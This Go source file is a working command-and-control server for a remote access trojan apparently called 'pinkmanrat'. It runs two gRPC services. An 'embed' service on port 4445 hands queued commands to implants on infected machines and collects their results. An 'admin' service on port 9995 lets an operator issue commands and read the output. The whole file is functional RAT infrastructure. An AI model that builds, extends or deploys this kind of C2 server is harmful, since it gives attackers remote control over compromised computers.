package main

import(
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"pinkmanrat/c2grpcapi"
	
	"google.golang.org/grpc"
)

type embedServer struct {
	work, output chan *c2grpcapi.Command
	c2grpcapi.UnimplementedEmbedServer
}

type adminServer struct {
	work, output chan *c2grpcapi.Command
	c2grpcapi.UnimplementedAdminServer
}

func NewEmbedServer(work, output chan *c2grpcapi.Command) *embedServer {
	s := new(embedServer)
	s.work = work
	s.output = output
	return s 
}

func NewAdminServer(work, output chan *c2grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s 
}

func (s *embedServer) GetCommand(ctx context.Context, empty *c2grpcapi.Empty) (*c2grpcapi.Command, error) {
	var cmd = new(c2grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel error")
	default:
		// in case of no work 
		return cmd, nil
	}
}

func (s *embedServer) SendResult(ctx context.Context, result *c2grpcapi.Command) (*c2grpcapi.Empty, error) {
	s.output <- result
	return &c2grpcapi .Empty{}, nil
}

func (s *adminServer) ExecuteCommand(ctx context.Context, cmd *c2grpcapi.Command) (*c2grpcapi.Command, error) {
	var result *c2grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	
	result = <- s.output
	return result, nil
}

func main() {
	var (
		embedListener, adminListener net.Listener
		err error
		opts []grpc.ServerOption
		work, output chan *c2grpcapi.Command
	)

	work, output = make(chan *c2grpcapi.Command), make(chan *c2grpcapi.Command)
	embed := NewEmbedServer(work, output)
	admin := NewAdminServer(work, output)

	if embedListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4445)); err != nil {
		log.Fatal(err)
	}

	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9995)); err != nil {
		log.Fatal(err)
	}

	grpcAdminServer, grpcEmbedServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	c2grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	c2grpcapi.RegisterEmbedServer(grpcEmbedServer, embed)

	fmt.Println("starting the c2 srever: admin and embed clients...")
	go func () {
		grpcEmbedServer.Serve(embedListener)
	}()
	grpcAdminServer.Serve(adminListener)
}

